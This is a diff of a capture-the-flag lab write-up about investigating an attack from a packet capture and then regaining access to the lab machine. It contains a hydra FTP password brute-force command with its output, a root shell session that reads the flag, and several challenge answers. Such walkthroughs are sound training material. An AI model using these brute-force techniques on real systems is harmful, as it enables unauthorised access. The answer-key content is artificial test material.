@@ -1,4 +1,4 @@
-**h4cked**
+***h4cked***
 
 Find out what happened by analysing a .pcap file and hack your way back into the machine
 
@@ -123,3 +123,49 @@ Q.11: The attacker downloaded something from GitHub. What is the name of the Git
 Q.12: The project can be used to install a stealthy backdoor on the system. It can be very hard to detect. What is this type of backdoor called?
 
 ```Answer: rootkit```
+
+**Deploy the machine**
+
+<img width="1360" height="613" alt="image" src="https://github.com/user-attachments/assets/d5897d9a-081a-4175-86ca-11e17844258b" />
+
+```
+┌──(kali㉿kali)-[~]
+└─$ hydra -l jenny -P /usr/share/wordlists/rockyou.txt 10.48.181.181 ftp
+Hydra v9.6 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-04-16 00:18:04
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
+[DATA] attacking ftp://10.48.181.181:21/
+[21][ftp] host: 10.48.181.181   login: jenny   password: 987654321
+1 of 1 target successfully completed, 1 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-04-16 00:18:26
+```
+
+<img width="842" height="267" alt="image" src="https://github.com/user-attachments/assets/1188a83a-dda2-4c31-b7f7-c37c88fa8624" />
+
+<img width="527" height="204" alt="image" src="https://github.com/user-attachments/assets/b04654e3-6fd5-420b-a13f-e49a32b3857c" />
+
+<img width="840" height="530" alt="image" src="https://github.com/user-attachments/assets/12556b7c-aeba-439a-a979-c11e3ba42251" />
+
+<img width="533" height="420" alt="image" src="https://github.com/user-attachments/assets/626b656a-e7dd-4fbf-a0ec-6f7ec19a5a19" />
+
+<img width="1262" height="113" alt="image" src="https://github.com/user-attachments/assets/ff5b572a-7127-457d-9514-c94cd257ae96" />
+
+```
+root@ip-10-48-181-181:~# ls
+ls
+Reptile  snap
+root@ip-10-48-181-181:~# cd Reptile
+cd Reptile
+root@ip-10-48-181-181:~/Reptile# ls
+ls
+configs   Kconfig  Makefile  README.md  userland
+flag.txt  kernel   output    scripts
+root@ip-10-48-181-181:~/Reptile# cd flag.txt
+cd flag.txt
+bash: cd: flag.txt: Not a directory
+root@ip-10-48-181-181:~/Reptile# cat flag.txt
+cat flag.txt
+ebcefd66ca4b559d17b440b6e67fd0fd
+root@ip-10-48-181-181:~/Reptile# 
+```
